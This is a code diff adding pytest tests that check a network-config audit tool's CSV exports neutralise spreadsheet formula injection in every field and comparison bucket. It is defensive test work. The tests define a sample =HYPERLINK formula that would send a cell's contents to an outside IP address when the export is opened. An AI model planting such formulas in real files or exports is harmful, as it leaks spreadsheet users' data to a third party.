@@ -454,6 +454,66 @@ def _rows(text):
     return list(csv.DictReader(io.StringIO(text)))
 
 
+#: Measured end to end on origin/main: a config whose hostname is a formula
+#: parses, the dead-rule finding names that device, and the downloaded CSV
+#: carries it unmodified in `device` and `source`, so a spreadsheet opening
+#: the export runs it. `=HYPERLINK(...)` sends a cell's contents anywhere.
+FORMULA = '=HYPERLINK("http://198.51.100.7/?"&A2,"open")'
+
+
+@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
+@pytest.mark.parametrize("field,builder", [
+    ("summary", lambda v: finding(summary=v)),
+    ("detail", lambda v: finding(evidence={"detail": v, "source": "x"})),
+    ("source", lambda v: finding(evidence={"detail": "x", "source": v})),
+    ("device", lambda v: finding(device=v)),
+])
+def test_config_text_cannot_become_a_spreadsheet_formula(field, builder, trigger):
+    """The CSV twin of the HTML escaping test above (OWASP CSV Injection).
+
+    A cell starting with one of these characters is evaluated, not shown.
+    The text must survive, readable, with a leading apostrophe -- the mark
+    a spreadsheet reads as "this is text".
+    """
+    hostile = trigger + FORMULA[1:]
+    cell = _rows(report.render_csv([builder(hostile)]))[0][field]
+
+    assert cell == "'" + hostile, (
+        f"{field}: a cell starting {trigger!r} reached the CSV unneutralised"
+    )
+
+
+@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
+@pytest.mark.parametrize("field,builder", [
+    ("summary", lambda v: finding(summary=v)),
+    ("detail", lambda v: finding(evidence={"detail": v, "source": "x"})),
+    ("source", lambda v: finding(evidence={"detail": "x", "source": v})),
+    ("device", lambda v: finding(device=v)),
+])
+@pytest.mark.parametrize("bucket", ["introduced", "resolved", "newly_blind", "newly_sighted"])
+def test_the_comparison_csv_defuses_formulas_in_every_bucket(bucket, field, builder, trigger):
+    """The second CSV this module writes ("Compare with an earlier scan") had
+    its own writerow, and the fix above only reached render_csv, so the same
+    hostname was defused in one export and live in the other (#476 review,
+    @shubhamkataria2005). Every row of every bucket goes through the same
+    function."""
+    hostile = trigger + FORMULA[1:]
+    buckets = {"introduced": [], "resolved": [], "newly_blind": [], "newly_sighted": []}
+    buckets[bucket] = [builder(hostile)]
+    text = report.render_comparison_csv(buckets["introduced"], buckets["resolved"], 0,
+                                        newly_blind=buckets["newly_blind"],
+                                        newly_sighted=buckets["newly_sighted"])
+    row = [r for r in _rows(text) if r["change_type"] == bucket][0]
+
+    assert row[field] == "'" + hostile
+
+
+def test_a_csv_cell_that_starts_harmlessly_is_left_exactly_as_it_was():
+    rows = _rows(report.render_csv([PROBLEM]))
+    assert rows[0]["summary"] == "Unencrypted web traffic is allowed out"
+    assert rows[0]["device"] == "rtr-us5"
+
+
 def test_csv_includes_the_findings_that_could_not_run():
     """An export that dropped the error rows would let a spreadsheet reader
     count the problems and conclude the rest was clean."""
